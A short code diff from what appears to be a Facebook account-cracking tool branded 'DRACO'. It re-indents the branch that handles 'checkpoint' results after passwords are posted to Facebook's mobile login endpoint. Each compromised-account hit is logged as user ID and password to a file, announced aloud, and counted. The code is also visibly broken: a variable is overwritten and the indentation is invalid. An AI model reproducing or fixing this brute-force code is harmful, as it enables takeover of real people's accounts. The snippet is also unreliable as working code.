@@ -516,11 +516,11 @@ def _M4_(ids,pasc):
                         po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)  
                         po=session.cookies.get_dict().keys()
                         if "checkpoint" in po.cookies.get_dict().keys():
-                        print(f'\r\033[0;95m[{time.strftime("%H:%M")}•DRACO-Cp] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
-                        os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
-                        open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
-                        akun.append(idf+' • '+pw)
-                        cp+=1
+                            print(f'\r\033[0;95m[{time.strftime("%H:%M")}•DRACO-Cp] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
+                            os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
+                            open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
+                            akun.append(idf+' • '+pw)
+                            cp+=1
                         break
                         elif "c_user" in ses.cookies.get_dict().keys():
                         ok+=1
